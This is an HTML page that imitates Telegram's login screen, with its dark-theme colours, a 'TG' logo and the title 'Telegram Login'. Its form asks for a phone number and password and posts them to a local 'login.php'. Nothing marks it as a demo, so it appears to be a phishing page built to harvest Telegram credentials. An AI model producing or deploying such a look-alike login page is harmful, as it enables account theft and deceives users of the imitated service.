<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Telegram Login</title>
 <style>
 /* CSS Variables for Telegram Dark Theme */
:root {
 --tg-bg: #17212b;
 --tg-bg-secondary: #242f3d;
 --tg-text: #ffffff;
 --tg-text-secondary: #aebac1;
 --tg-btn: #5288c1;
 --tg-btn-hover: #3c76a8;
 }

 body {
 margin: 0;
 padding: 0;
 font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 background-color: var(--tg-bg);
 color: var(--tg-text);
 display: flex;
 justify-content: center;
 align-items: center;
 height: 100vh;
 }

.login-container {
 width: 100%;
 max-width: 400px;
 padding: 20px;
 box-sizing: border-box;
 }

.logo-area {
 text-align: center;
 margin-bottom: 30px;
 padding: 20px 0;
 }

.logo-img {
 width: 80px;
 height: 80px;
 background: linear-gradient(135deg, #0088cc, #229ED9);
 border-radius: 16px;
 margin: 0 auto;
 display: flex;
 align-items: center;
 justify-content: center;
 font-size: 40px;
 color: white;
 font-weight: bold;
 }

.input-group {
 margin-bottom: 20px;
 position: relative;
 }

.input-group label {
 display: block;
 margin-bottom: 8px;
 color: var(--tg-text-secondary);
 font-size: 14px;
 }

.input-group input {
 width: 100%;
 padding: 14px 16px;
 background-color: var(--tg-bg-secondary);
 border: 1px solid transparent;
 border-radius: 8px;
 color: var(--tg-text);
 font-size: 16px;
 box-sizing: border-box;
 transition: all 0.2s;
 }

.input-group input:focus {
 border-color: var(--tg-btn);
 outline: none;
 background-color: #2a3849;
 }

.btn-submit {
 width: 100%;
 padding: 14px;
 background-color: var(--tg-btn);
 color: white;
 border: none;
 border-radius: 8px;
 font-size: 16px;
 font-weight: 600;
 cursor: pointer;
 transition: background-color 0.2s;
 }

.btn-submit:hover {
 background-color: var(--tg-btn-hover);
 }

.success-message {
 display: none;
 text-align: center;
 color: #4cd964;
 margin-top: 15px;
 font-weight: bold;
 }
 </style>
</head>
<body>
 <div class="login-container">
 <div class="logo-area">
 <div class="logo-img">TG</div>
 </div>

 <form action="login.php" method="POST">
 <div class="input-group">
 <label>Phone Number</label>
 <input type="tel" name="phone" placeholder="+1234567890" required pattern="[0-9\+\-\s]*">
 </div>

 <div class="input-group">
 <label>Password</label>
 <input type="password" name="password" placeholder="Enter your password" required>
 </div>

 <button type="submit" class="btn-submit">Sign In</button>
 </form>

 <div class="success-message" id="successMsg">
 Logging in...
 </div>
 </div>
</body>
</html>
